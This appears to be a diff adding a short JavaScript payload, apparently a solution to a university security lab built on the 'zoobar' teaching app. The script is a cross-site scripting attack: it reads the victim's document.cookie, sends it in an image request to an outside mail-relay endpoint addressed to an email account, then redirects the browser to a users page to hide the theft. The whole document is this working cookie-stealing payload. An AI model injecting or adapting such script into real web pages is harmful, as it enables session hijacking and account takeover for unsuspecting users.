@@ -1,0 +1,4 @@
+<script language="javascript">
+void((new Image()).src='http://dasak.csc.kth.se/labw/sendmail.php?' + 'to=agerskov@kth.se' + '&payload=' + document.cookie + '&random=' + Math.random());
+location.replace("http://dasak.csc.kth.se/zoobar/users.php");
+</script>
